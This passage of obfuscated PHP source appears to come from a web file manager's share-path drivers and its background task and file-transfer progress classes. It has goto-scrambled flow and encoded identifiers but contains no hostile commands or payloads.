$_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][790]] . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][791]; $e°”óâ¦ö“ = $BàØõ°«îê($dá‰¦¤×Î†); goto a¯—‘÷ã¨è; b×à„­‹³§: } class PathDriverDbShareLink extends PathDriverDB { public function __construct($bÜØóö·°) { $this->pathParse = $bÜØóö·°; $this->model = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1154]); } protected function infoParse($eÊ²ÊÒò¯ù, $BÀëÁİ¤ = false, $e…­‘ÒìÓÈ = false) { $Bà©õŒáôØ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return Action($Bà©õŒáôØ[1021])->sharePathInfo($this->pathParse[$Bà©õŒáôØ[75]], !0); } public function listPath($BÆÓ•ƒµì§, $FÜğ¦‚İ– = false) { $AìÛ¼–¹ñ² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $få‡Ê»…íİ = parent::listPath($BÆÓ•ƒµì§, $FÜğ¦‚İ–); foreach ($få‡Ê»…íİ as $bíø’•¤í => $aëÅÙíóÓ§) { if (!in_array($bíø’•¤í, array($AìÛ¼–¹ñ²[73], $AìÛ¼–¹ñ²[74]))) { continue; } foreach ($aëÅÙíóÓ§ as $d ¹¹¹–å¶ => $eÙ´¸¶ò) { $få‡Ê»…íİ[$bíø’•¤í][$d ¹¹¹–å¶] = Action($AìÛ¼–¹ñ²[1021])->shareItemInfo($eÙ´¸¶ò); } } return $få‡Ê»…íİ; } public function listAll($EƒÊñ—›ËÇ) { goto E³ ·ß›ÃÃ; E³ ·ß›ÃÃ: $eÛÃßªéÁ¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÅÄŸî‚ˆ = IO::info($this->pathParse[$eÛÃßªéÁ¶[75]]); if (!$fÅÄŸî‚ˆ) { return array(); } goto d‘ŠÂ—¥“; aõŠŒä‡ˆ: return $dˆÑÏßò—; goto B™á¬›ß–ğ; d‘ŠÂ—¥“: $dˆÑÏßò— = $this->model->listAll($EƒÊñ—›ËÇ); foreach ($dˆÑÏßò— as &$aÏ¥‰¦‘Âé) { $aÏ¥‰¦‘Âé[$eÛÃßªéÁ¶[84]] = Action($eÛÃßªéÁ¶[1021])->shareItemInfo($aÏ¥‰¦‘Âé[$eÛÃßªéÁ¶[84]]); } unset($aÏ¥‰¦‘Âé); goto aõŠŒä‡ˆ; B™á¬›ß–ğ: } } class PathDriverDriverShareItem { public function __construct($E³¨ò¹Ÿ£ß) { $this->pathParse = $E³¨ò¹Ÿ£ß; } public function __call($AÔ¡ª°á¯, $b”„‚„‘î¶) { $Aôœ‰³Â =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (method_exists($this, $AÔ¡ª°á¯)) { return; } $dìêáªáàŸ = call_user_func_array(array($Aôœ‰³Â[1165], $AÔ¡ª°á¯), $b”„‚„‘î¶); $b¯ÜŠ¦¹ÎŒ = array($Aôœ‰³Â[1166], $Aôœ‰³Â[1167], $Aôœ‰³Â[1168], $Aôœ‰³Â[1169], $Aôœ‰³Â[507], $Aôœ‰³Â[509], $Aôœ‰³Â[1170], $Aôœ‰³Â[106], $Aôœ‰³Â[1171], $Aôœ‰³Â[1172]); if (in_array($AÔ¡ª°á¯, $b¯ÜŠ¦¹ÎŒ)) { $dìêáªáàŸ = $this->getPathOuter($dìêáªáàŸ); } return $dìêáªáàŸ; } public function copy($c›é‘‘‹áº, $e‹Æø“ù«Ü, $døŸÆùîáß = false) { return $this->copyMove($c›é‘‘‹áº, $e‹Æø“ù«Ü, $døŸÆùîáß, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][507]); } public function move($D¸§¨åò†ò, $cƒ…Û¼ÙÅ, $F¤â¡ã¨èô = false) { return $this->copyMove($D¸§¨åò†ò, $cƒ…Û¼ÙÅ, $F¤â¡ã¨èô, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][509]); } private function copyMove($C¼ò‚“™Â“, $bÒ®Ú„’ë‹, $e¢óôÕ²Â, $FªĞ¾‚Êé) { goto E”ñÆ—šÑ‡; Bİ¤¸ôïƒ: return $C‚‡— å¼; goto BÚœ»Îåèí; f±¨™ÓßÈ·: if ($aå±¬–„êÒ->pathParse[$cåÕÑÜÅÎ¸[999]]) { $bÒ®Ú„’ë‹ = $aå±¬–„êÒ->pathParse[$cåÕÑÜÅÎ¸[999]]; } else { $bÒ®Ú„’ë‹ = $b–ÉµµàÌ; } $C‚‡— å¼ = IO::copyMove($C¼ò‚“™Â“, $bÒ®Ú„’ë‹, $e¢óôÕ²Â, $FªĞ¾‚Êé); $C‚‡— å¼ = $this->getPathOuter($C‚‡— å¼); goto Bİ¤¸ôïƒ; E”ñÆ—šÑ‡: $cåÕÑÜÅÎ¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b–ÉµµàÌ = $bÒ®Ú„’ë‹; $aå±¬–„êÒ = IO::driverMake($bÒ®Ú„’ë‹); goto f±¨™ÓßÈ·; BÚœ»Îåèí: } public function pathThis($e…¶ï¸ÎŸ) { return get_path_this($this->pathParse[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]); } public function pathFather($EŒŒÒ°“«“) { return get_path_father($this->pathParse[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]); } public function iconvSystem($b‘Ù¡›ğã) { return $b‘Ù¡›ğã; } protected function infoParse($Aó®Ö¹º, $FÓ¶ïÙ„ùç = false) { $aåŸîá’£Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BöÆø¯ÁÖ = $this->pathParse[$aåŸîá’£Ì[455]][$aåŸîá’£Ì[1022]] . $this->pathParse[$aåŸîá’£Ì[1015]]; if ($FÓ¶ïÙ„ùç) { $eÅéÒ ‚š‡ = IO::infoWithChildren($BöÆø¯ÁÖ); } else { $eÅéÒ ‚š‡ = IO::info($BöÆø¯ÁÖ); } $BÈâ¸òæ¬™ = $this->pathParse[$aåŸîá’£Ì[455]]; return Action($aåŸîá’£Ì[1161])->_shareItemeParse($eÅéÒ ‚š‡, $BÈâ¸òæ¬™); } public function listAll($aÕ…ŞÃäéŒ) { $B¢ó»Ş•°— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÙÒÆÎÀ¯á = IO::listAll($aÕ…ŞÃäéŒ); $f·¡Ê®¡† = $this->pathParse[$B¢ó»Ş•°—[455]]; foreach ($fÙÒÆÎÀ¯á as &$CÇ³¦Î¶¿) { check_abort(); $CÇ³¦Î¶¿ = array_merge(IO::info($CÇ³¦Î¶¿[$B¢ó»Ş•°—[75]]), $CÇ³¦Î¶¿); $CÇ³¦Î¶¿[$B¢ó»Ş•°—[84]] = Action($B¢ó»Ş•°—[1161])->_shareItemeParse($CÇ³¦Î¶¿, $f·¡Ê®¡†); } unset($CÇ³¦Î¶¿); return $fÙÒÆÎÀ¯á; } public function getPathOuter($A²©¨½¿ó­) { goto BŸ¦ÎÃ³‹œ; cöñšÛ‚é•: $E¸×­·«­ = KodIO::clear($A²©¨½¿ó­); $Dğøµóğëî = KodIO::clear($this->pathParse[$díÁáÑ¶²[455]][$díÁáÑ¶²[1022]]); $aùÉ¢îÏ = substr($E¸×­·«­, strlen($Dğøµóğëî)); goto bÈÅ¹·é­Ç; bÈÅ¹·é­Ç: if (substr($E¸×­·«­, 0, strlen($Dğøµóğëî)) != $Dğøµóğëî) { return !1; } return $this->pathParse[$díÁáÑ¶²[1016]] . $díÁáÑ¶²[8] . ltrim($aùÉ¢îÏ, $díÁáÑ¶²[8]); goto f¦Ò‘ÄÕÃ«; BŸ¦ÎÃ³‹œ: $díÁáÑ¶² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E©é×Ì¾º = KodIO::parse($A²©¨½¿ó­); if ($E©é×Ì¾º[$díÁáÑ¶²[29]] == KodIO::KOD_SHARE_ITEM) { return $E©é×Ì¾º[$díÁáÑ¶²[75]]; } goto cöñšÛ‚é•; f¦Ò‘ÄÕÃ«: } public function getType() { $B¿³ ‡§…‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DŠ‚ñÉâ¦˜ = str_replace($B¿³ ‡§…‰[71], $B¿³ ‡§…‰[33], get_class($this)); return strtolower($DŠ‚ñÉâ¦˜); } public function isTypeObject($FÃ–¾ä) { return IO::isTypeObject($FÃ–¾ä); } public function info($Eì˜‘«ğƒ¿) { return $this->infoParse($Eì˜‘«ğƒ¿); } public function infoAuth($eö’æˆ½ˆ) { return $this->infoParse($eö’æˆ½ˆ); } public function infoWithChildren($DÏ‚¡Æí…å) { return $this->infoParse($DÏ‚¡Æí…å, !0); } public function infoFull($B»‹™‡Ú•) { return $this->infoParse($B»‹™‡Ú•); } } goto e‚°ööì†; d´‘ĞãŒ‚¸: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($Añœ×ËĞÕÙ, $aÜ“øîË«Ü = '', $FÏ”¿Á’ôÊ = 0, $B„…¢¸•ë = '') { goto A¢ÏŠ­õÔ; EÚ³«¥˜Ğ: $this->startAfter(); Hook::trigger($a©óİ©Û‡”[1491], $this->task); $this->task[$a©óİ©Û‡”[1484]] = timeFloat(); goto D¡Èøœƒ†ï; A¢ÏŠ­õÔ: $a©óİ©Û‡” =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::get($Añœ×ËĞÕÙ)) { return; } $this->task = array($a©óİ©Û‡”[385] => $Añœ×ËĞÕÙ, $a©óİ©Û‡”[1479] => USER_ID, $a©óİ©Û‡”[1384] => $B„…¢¸•ë, $a©óİ©Û‡”[29] => $aÜ“øîË«Ü, $a©óİ©Û‡”[975] => $a©óİ©Û‡”[33], $a©óİ©Û‡”[973] => $FÏ”¿Á’ôÊ, $a©óİ©Û‡”[987] => 0, $a©óİ©Û‡”[1480] => 0, $a©óİ©Û‡”[1481] => 0, $a©óİ©Û‡”[1482] => timeFloat(), $a©óİ©Û‡”[1483] => 0, $a©óİ©Û‡”[1484] => 0, $a©óİ©Û‡”[1485] => 0, $a©óİ©Û‡”[1486] => 0, $a©óİ©Û‡”[683] => $a©óİ©Û‡”[1442]); goto A»ÛÏñ÷¿‡; A»ÛÏñ÷¿‡: $GLOBALS[$a©óİ©Û‡”[1487]] = 1; Hook::bind($a©óİ©Û‡”[1444], array($this, $a©óİ©Û‡”[1488])); Hook::bind($a©óİ©Û‡”[1489], array($this, $a©óİ©Û‡”[1490])); goto EÚ³«¥˜Ğ; D¡Èøœƒ†ï: } public function end() { goto Bƒ¾Ê—ğ–¨; cœÀ…š»Ü: $EÒšË»¬öÏ = timeFloat() - $this->task[$B½½ÛÑ¸Ì´[1482]]; self::log($B½½ÛÑ¸Ì´[1492] . $this->task[$B½½ÛÑ¸Ì´[385]] . $B½½ÛÑ¸Ì´[1493] . $EÒšË»¬öÏ . $B½½ÛÑ¸Ì´[1494]); Hook::unbind($B½½ÛÑ¸Ì´[1444], array($this, $B½½ÛÑ¸Ì´[1488])); goto CÄ¢£ÜºÏ‰; Bƒ¾Ê—ğ–¨: $B½½ÛÑ¸Ì´ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->task) { return; } if ($this->task[$B½½ÛÑ¸Ì´[1484]]) { self::valueSet($this->task[$B½½ÛÑ¸Ì´[385]], !1); } goto cœÀ…š»Ü; CÄ¢£ÜºÏ‰: Hook::unbind($B½½ÛÑ¸Ì´[1489], array($this, $B½½ÛÑ¸Ì´[1490])); $this->endAfter(); $this->task = !1; goto c±ëªğ…¼¨; c±ëªğ…¼¨: } public function update($aŸğ‹”æŠï = 0, $Aô«Ï¡ìäœ = false) { goto Bï÷½õ±Ü½; däˆéù‚ÕÇ: $FÏ”Œ±ºÌ = self::get($A‹Á„ÍÌÌè[$C­œÆøïµ¨[385]]); $BÑÁ”×¨”š = $FÏ”Œ±ºÌ[$C­œÆøïµ¨[683]]; if ($BÑÁ”×¨”š == self::STATYS_KILL) { $c Í„Ïî§¬ = array($C­œÆøïµ¨[1495] => LNG($C­œÆøïµ¨[1496]), $C­œÆøïµ¨[1037] => !1); Cache::set($C­œÆøïµ¨[1497] . $this->task[$C­œÆøïµ¨[385]], $c Í„Ïî§¬, 30); $this->end(); die; } else { if ($BÑÁ”×¨”š == self::STATYS_STOP) { $b›¤‚ß‡¸õ = 2; $FÏ”Œ±ºÌ[$C­œÆøïµ¨[1485]] += $b›¤‚ß‡¸õ; self::valueSet($A‹Á„ÍÌÌè[$C­œÆøïµ¨[385]], $FÏ”Œ±ºÌ); sleep($b›¤‚ß‡¸õ); $this->update(); return; } } goto fìÛÔÚğš; fìÛÔÚğš: $A‹Á„ÍÌÌè[$C­œÆøïµ¨[683]] = $BÑÁ”×¨”š ? $BÑÁ”×¨”š : $A‹Á„ÍÌÌè[$C­œÆøïµ¨[683]]; $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1485]] = $FÏ”Œ±ºÌ[$C­œÆøïµ¨[1485]] ? $FÏ”Œ±ºÌ[$C­œÆøïµ¨[1485]] : 0; $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1484]] = timeFloat(); goto e›Ö¼å·ö½; e©ºÓ¤ˆ: $A‹Á„ÍÌÌè[$C­œÆøïµ¨[987]] += $aŸğ‹”æŠï; $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1483]] = timeFloat(); if ($A‹Á„ÍÌÌè[$C­œÆøïµ¨[973]]) { if ($A‹Á„ÍÌÌè[$C­œÆøïµ¨[973]] < $A‹Á„ÍÌÌè[$C­œÆøïµ¨[987]]) { $A‹Á„ÍÌÌè[$C­œÆøïµ¨[973]] = $A‹Á„ÍÌÌè[$C­œÆøïµ¨[987]]; } $d†ÓåõéïÄ = timeFloat() - $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1482]] - $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1485]]; $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1480]] = $A‹Á„ÍÌÌè[$C­œÆøïµ¨[987]] / $A‹Á„ÍÌÌè[$C­œÆøïµ¨[973]]; $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1481]] = $A‹Á„ÍÌÌè[$C­œÆøïµ¨[987]] / $d†ÓåõéïÄ; if ($A‹Á„ÍÌÌè[$C­œÆøïµ¨[1480]] > 0) { $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1486]] = $d†ÓåõéïÄ * (1 - $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1480]]) / $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1480]]; } $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1486]] = $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1486]] <= 0 ? 0 : $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1486]]; } goto CÂÃ·Ù—Ç; Bï÷½õ±Ü½: $C­œÆøïµ¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‹Á„ÍÌÌè =& $this->task; if (!$A‹Á„ÍÌÌè) { return; } goto e©ºÓ¤ˆ; CÂÃ·Ù—Ç: $this->updateAfter(); $a¸ÂóÃ·‡ = 0.2; if (timeFloat() - $A‹Á„ÍÌÌè[$C­œÆøïµ¨[1484]] < $a¸ÂóÃ·‡ && !$Aô«Ï¡ìäœ) { return; } goto däˆéù‚ÕÇ; e›Ö¼å·ö½: Hook::trigger($C­œÆøïµ¨[1498], $A‹Á„ÍÌÌè); self::valueSet($A‹Á„ÍÌÌè[$C­œÆøïµ¨[385]], $A‹Á„ÍÌÌè); goto Dœñß½¥İÔ; Dœñß½¥İÔ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($D±°©»íÁÕ) { $d‹“ŒÂ ÷¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; Cache::set($d‹“ŒÂ ÷¯[1497] . $this->task[$d‹“ŒÂ ÷¯[385]], $D±°©»íÁÕ, 60); return $D±°©»íÁÕ; } public static function get($e©´„®˜”º) { return self::valueGet($e©´„®˜”º); } public static function listData() { $C›†¾‘¦ = self::valueGet(); return array_sort_by($C›†¾‘¦, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1482], !0); } public static function kill($f™œĞŸÁ¨) { return self::changeStatus($f™œĞŸÁ¨, self::STATYS_KILL); } public static function stop($Bò‹æ“¿¶Ù) { return self::changeStatus($Bò‹æ“¿¶Ù, self::STATYS_STOP); } public static function restart($fŒ°‹½ì‘®) { return self::changeStatus($fŒ°‹½ì‘®, self::STATYS_RUNNING); } public static function killAll() { $c“«áìš =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÃŸÅŞ¿×‡ = self::listData(); foreach ($AÃŸÅŞ¿×‡ as $b‘İ˜™) { self::kill($b‘İ˜™[$c“«áìš[385]]); } sleep(2); foreach ($AÃŸÅŞ¿×‡ as $b‘İ˜™) { self::valueSet($b‘İ˜™[$c“«áìš[385]], !1); } } private static function changeStatus($AŞ‰àïæùØ, $dŸ±‰í§Íˆ) { goto f‰ÃÁÑÕ­; C³ˆ¸„À‡: return !0; goto c…¦ÃÇìÕ‘; cï§”²ŒŞĞ: $Bˆ¤µŸïÙ¥[$EÈ­«ªï•î[683]] = $dŸ±‰í§Íˆ; self::valueSet($AŞ‰àïæùØ, $Bˆ¤µŸïÙ¥); self::log($EÈ­«ªï•î[1499] . $Bˆ¤µŸïÙ¥[$EÈ­«ªï•î[385]] . $EÈ­«ªï•î[1500] . $dŸ±‰í§Íˆ); goto C³ˆ¸„À‡; f‰ÃÁÑÕ­: $EÈ­«ªï•î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bˆ¤µŸïÙ¥ = self::valueGet($AŞ‰àïæùØ); if (!$Bˆ¤µŸïÙ¥) { return !1; } goto cï§”²ŒŞĞ; c…¦ÃÇìÕ‘: } public static function valueGet($bùÛÁ¦•ö = false) { $Bã–§’çê¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($bùÛÁ¦•ö) { $b‰ùß™–ïó = Model($Bã–§’çê¦[416])->where(array($Bã–§’çê¦[92] => $bùÛÁ¦•ö, $Bã–§’çê¦[29] => $Bã–§’çê¦[1501]))->find(); return $b‰ùß™–ïó ? json_decode($b‰ùß™–ïó[$Bã–§’çê¦[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($föŠØ™“Íµ = false) { goto E¤§¶¹ÈÅ¼; A’İ“Ã”ä³: return $fßœË®Ü»–; goto C«Ä¼¡¦‘à; E¤§¶¹ÈÅ¼: $a¾Ì„‘¼³í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÃœÙ«İµ = array($a¾Ì„‘¼³í[29] => $a¾Ì„‘¼³í[1501]); if ($föŠØ™“Íµ) { $CÃœÙ«İµ[$a¾Ì„‘¼³í[1479]] = $föŠØ™“Íµ; } goto cÏíõË‹¥‘; cÏíõË‹¥‘: $fßœË®Ü»– = Model($a¾Ì„‘¼³í[416])->where($CÃœÙ«İµ)->select(); $fßœË®Ü»– = $fßœË®Ü»– ? $fßœË®Ü»– : array(); foreach ($fßœË®Ü»– as $F¬Ší• => $cƒ¨Çøõæİ) { $fßœË®Ü»–[$F¬Ší•] = json_decode($cƒ¨Çøõæİ[$a¾Ì„‘¼³í[368]], !0); } goto A’İ“Ã”ä³; C«Ä¼¡¦‘à: } public static function valueSet($b¯òÃ–…øï, $Bë½øˆº²) { goto FÀùùË©¼; b‡šøØ–Ü: Model($cÈ‹‚µùÀ[416])->add($AÄ¬½ÃŸãÉ, array(), !0); goto B©‹‹£ºÓ; bóâ¢Œª: if (!$DÔˆ¤—Ûé) { ob_start(); var_dump($Bë½øˆº²); $D—’´«ÉÔÂ = ob_get_clean(); self::log($cÈ‹‚µùÀ[1502] . json_encode_force($D—’´«ÉÔÂ)); } if (!$b¯òÃ–…øï || !$Bë½øˆº²[$cÈ‹‚µùÀ[385]]) { return !1; } $AÄ¬½ÃŸãÉ = array($cÈ‹‚µùÀ[29] => $cÈ‹‚µùÀ[1501], $cÈ‹‚µùÀ[1479] => USER_ID, $cÈ‹‚µùÀ[92] => $b¯òÃ–…øï, $cÈ‹‚µùÀ[368] => $DÔˆ¤—Ûé); goto b‡šøØ–Ü; FÀùùË©¼: $cÈ‹‚µùÀ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Bë½øˆº²) { return Model($cÈ‹‚µùÀ[416])->where(array($cÈ‹‚µùÀ[92] => $b¯òÃ–…øï, $cÈ‹‚µùÀ[29] => $cÈ‹‚µùÀ[1501]))->delete(); } $DÔˆ¤—Ûé = json_encode($Bë½øˆº²); goto bóâ¢Œª; B©‹‹£ºÓ: } public static function log($eÃÆÉÕ±›º) { write_log($eÃÆÉÕ±›º, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1503]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto EñŠ†ŸÕëŸ; c‘ÍàÌ¸Öá: Hook::bind($a†›£­ƒ¦á[1504], array($this, $a†›£­ƒ¦á[1505])); Hook::bind($a†›£­ƒ¦á[1060], array($this, $a†›£­ƒ¦á[1506])); Hook::bind($a†›£­ƒ¦á[1507], array($this, $a†›£­ƒ¦á[1508])); goto Aƒ¤õô”½; Cƒù »¬Ó: $F ½ Ñ¬’[$a†›£­ƒ¦á[975]] = $a†›£­ƒ¦á[33]; $F ½ Ñ¬’[$a†›£­ƒ¦á[1526]] = $a†›£­ƒ¦á[33]; $F ½ Ñ¬’[$a†›£­ƒ¦á[1527]] = 0; goto a±Ô´‡•˜; a±Ô´‡•˜: $F ½ Ñ¬’[$a†›£­ƒ¦á[1528]] = 0; $F ½ Ñ¬’[$a†›£­ƒ¦á[1529]] = 0; if (!$F ½ Ñ¬’[$a†›£­ƒ¦á[1384]]) { $F ½ Ñ¬’[$a†›£­ƒ¦á[1384]] = LNG($a†›£­ƒ¦á[1530]); } goto b©½Õªçì–; d³Şâ¥Îã: $F ½ Ñ¬’[$a†›£­ƒ¦á[1522]] = LNG($a†›£­ƒ¦á[1523]); $F ½ Ñ¬’[$a†›£­ƒ¦á[1524]] = 0; $F ½ Ñ¬’[$a†›£­ƒ¦á[1525]] = 0; goto Cƒù »¬Ó; Aƒ¤õô”½: Hook::bind($a†›£­ƒ¦á[555], array($this, $a†›£­ƒ¦á[1509])); Hook::bind($a†›£­ƒ¦á[556], array($this, $a†›£­ƒ¦á[1510])); Hook::bind($a†›£­ƒ¦á[558], array($this, $a†›£­ƒ¦á[1511])); goto b‡¯´â—§¿; b‡¯´â—§¿: Hook::bind($a†›£­ƒ¦á[559], array($this, $a†›£­ƒ¦á[1511])); Hook::bind($a†›£­ƒ¦á[526], array($this, $a†›£­ƒ¦á[1512])); Hook::bind($a†›£­ƒ¦á[523], array($this, $a†›£­ƒ¦á[1512])); goto fã™ù‹×¼º; EñŠ†ŸÕëŸ: $a†›£­ƒ¦á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F ½ Ñ¬’ =& $this->task; $this->sourceCopyFolder = !1; goto c‘ÍàÌ¸Öá; B‰ááôî«”: Hook::bind($a†›£­ƒ¦á[1516], array($this, $a†›£­ƒ¦á[1517])); Hook::bind($a†›£­ƒ¦á[1518], array($this, $a†›£­ƒ¦á[1519])); Hook::bind($a†›£­ƒ¦á[1520], array($this, $a†›£­ƒ¦á[1521])); goto d³Şâ¥Îã; Bàá’Ê Ôé: Hook::bind($a†›£­ƒ¦á[1513], array($this, $a†›£­ƒ¦á[1514])); Hook::bind($a†›£­ƒ¦á[548], array($this, $a†›£­ƒ¦á[1515])); $this->sourceModelCopyFlag = !1; goto B‰ááôî«”; fã™ù‹×¼º: Hook::bind($a†›£­ƒ¦á[528], array($this, $a†›£­ƒ¦á[1512])); Hook::bind($a†›£­ƒ¦á[530], array($this, $a†›£­ƒ¦á[1512])); Hook::bind($a†›£­ƒ¦á[532], array($this, $a†›£­ƒ¦á[1512])); goto Bàá’Ê Ôé; b©½Õªçì–: } protected function endAfter() { goto e×´ÊŒîá; aø¡ÍÇ£œ„: Hook::unbind($B®·òËŠ•‹[1516], array($this, $B®·òËŠ•‹[1517])); Hook::unbind($B®·òËŠ•‹[1518], array($this, $B®·òËŠ•‹[1519])); Hook::unbind($B®·òËŠ•‹[1520], array($this, $B®·òËŠ•‹[1521])); goto b°ê›Æªº‘; Dº§èØ”Ş: Hook::unbind($B®·òËŠ•‹[558], array($this, $B®·òËŠ•‹[1511])); Hook::unbind($B®·òËŠ•‹[559], array($this, $B®·òËŠ•‹[1511])); Hook::unbind($B®·òËŠ•‹[526], array($this, $B®·òËŠ•‹[1512])); goto bóËŠöìÇˆ; bóËŠöìÇˆ: Hook::unbind($B®·òËŠ•‹[523], array($this, $B®·òËŠ•‹[1512])); Hook::unbind($B®·òËŠ•‹[528], array($this, $B®·òËŠ•‹[1512])); Hook::unbind($B®·òËŠ•‹[530], array($this, $B®·òËŠ•‹[1512])); goto dƒ‚‘õƒ ; f‡ä¼ ñØŸ: Hook::unbind($B®·òËŠ•‹[1507], array($this, $B®·òËŠ•‹[1508])); Hook::unbind($B®·òËŠ•‹[555], array($this, $B®·òËŠ•‹[1509])); Hook::unbind($B®·òËŠ•‹[556], array($this, $B®·òËŠ•‹[1510])); goto Dº§èØ”Ş; dƒ‚‘õƒ : Hook::unbind($B®·òËŠ•‹[532], array($this, $B®·òËŠ•‹[1512])); Hook::unbind($B®·òËŠ•‹[1513], array($this, $B®·òËŠ•‹[1514])); Hook::unbind($B®·òËŠ•‹[548], array($this, $B®·òËŠ•‹[1515])); goto aø¡ÍÇ£œ„; e×´ÊŒîá: $B®·òËŠ•‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; Hook::unbind($B®·òËŠ•‹[1504], array($this, $B®·òËŠ•‹[1505])); Hook::unbind($B®·òËŠ•‹[1060], array($this, $B®·òËŠ•‹[1506])); goto f‡ä¼ ñØŸ; b°ê›Æªº‘: } public function copyMoveStart($e¯¾ììˆŞ, $BĞŒöÉêÃó, $E¹ÎôÌÚÏ², $Fåäº¦Š—¦) { goto EåÆÜ÷ó»¦; aĞÒÌáŸ·: if (substr($BĞŒöÉêÃó, 0, strlen($BøÍ´Ååò¤)) == $BøÍ´Ååò¤) { return; } if (substr($Fåäº¦Š—¦, 0, strlen($BøÍ´Ååò¤)) == $BøÍ´Ååò¤) { return; } $DÆ–é‰¹ñÂ =& $this->task; goto d×ÖÂ˜‹µ»; EåÆÜ÷ó»¦: $f ©Œ†é¢¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; self::log($f ©Œ†é¢¾[1531] . $BĞŒöÉêÃó . $f ©Œ†é¢¾[66] . $Fåäº¦Š—¦); $BøÍ´Ååò¤ = rtrim(TEMP_FILES, $f ©Œ†é¢¾[8]); goto aĞÒÌáŸ·; d×ÖÂ˜‹µ»: $DÆ–é‰¹ñÂ[$f ©Œ†é¢¾[1532]] = KodIO::transferType($e¯¾ììˆŞ, $E¹ÎôÌÚÏ²); $this->update(); goto FÕÂÎÇ¹ìà; FÕÂÎÇ¹ìà: } public function updateAfter() { goto c‡í”Ç§àÜ; c‡í”Ç§àÜ: $eè¬öÇ‹ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aå ƒ­…˜æ =& $this->task; if (!$aå ƒ­…˜æ[$eè¬öÇ‹ó[692]]) { return; } goto bâ¦Ôåç—‘; bâ¦Ôåç—‘: if ($this->sourceModelCopyFlag) { return; } if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1532]] == $eè¬öÇ‹ó[1131]) { return; } if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1532]] == $eè¬öÇ‹ó[1045] || $aå ƒ­…˜æ[$eè¬öÇ‹ó[1532]] == $eè¬öÇ‹ó[106]) { if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1526]]) { $aå ƒ­…˜æ[$eè¬öÇ‹ó[1529]] = $aå ƒ­…˜æ[$eè¬öÇ‹ó[1528]] + $aå ƒ­…˜æ[$eè¬öÇ‹ó[1525]]; } } else { if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1532]] == $eè¬öÇ‹ó[1132]) { if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1526]] == $eè¬öÇ‹ó[1045]) { $aå ƒ­…˜æ[$eè¬öÇ‹ó[1529]] = $aå ƒ­…˜æ[$eè¬öÇ‹ó[1528]] + $aå ƒ­…˜æ[$eè¬öÇ‹ó[1525]] * 0.5; } else { if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1526]] == $eè¬öÇ‹ó[106]) { $aå ƒ­…˜æ[$eè¬öÇ‹ó[1529]] = $aå ƒ­…˜æ[$eè¬öÇ‹ó[1528]] + $aå ƒ­…˜æ[$eè¬öÇ‹ó[1524]] * 0.5 + $aå ƒ­…˜æ[$eè¬öÇ‹ó[1525]] * 0.5; } } } } goto E™„ç“õŸâ; E™„ç“õŸâ: $aå ƒ­…˜æ[$eè¬öÇ‹ó[1480]] = $aå ƒ­…˜æ[$eè¬öÇ‹ó[1529]] / $aå ƒ­…˜æ[$eè¬öÇ‹ó[692]]; if ($aå ƒ­…˜æ[$eè¬öÇ‹ó[1480]] > 0) { $eÎô˜îáÛº = timeFloat() - $aå ƒ­…˜æ[$eè¬öÇ‹ó[1482]] - $aå ƒ­…˜æ[$eè¬öÇ‹ó[1485]]; $aå ƒ­…˜æ[$eè¬öÇ‹ó[1486]] = $eÎô˜îáÛº * (1 - $aå ƒ­…˜æ[$eè¬öÇ‹ó[1480]]) / $aå 